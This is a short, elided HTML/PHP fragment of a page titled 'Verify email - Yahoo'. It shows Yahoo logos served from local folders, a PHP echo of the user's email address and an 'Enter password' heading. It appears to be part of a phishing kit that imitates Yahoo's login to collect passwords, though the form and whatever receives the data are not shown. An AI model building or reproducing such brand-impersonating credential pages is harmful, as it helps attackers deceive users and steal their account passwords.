...
<head>
	<meta charset="utf-8">
	<title>Verify email - Yahoo</title>
	...
	<link rel="shortcut icon" type="image/jpg" href="../static/img/yahoo-favicon.ico"/>
...
<body>
	<div class="py-4 px-5" style="position: relative; width: 100%;">
		<img src="../static/img/yahoo.png" width="100px" />
		<a class="py-2" href="" style="float: right;"><b>Help</b></a>
	</div>
	<div class="container">
		<div class="card text-center p-4" style="height: 550px;">
			<img class="mx-auto my-1" src="../static/img/yahoo.png" width="100px" />
			<b class="my-2" style="font-weight: 500;"><?php echo $email;?></b>
			<h4><b style="font-weight: 600;">Enter password</b></h4>
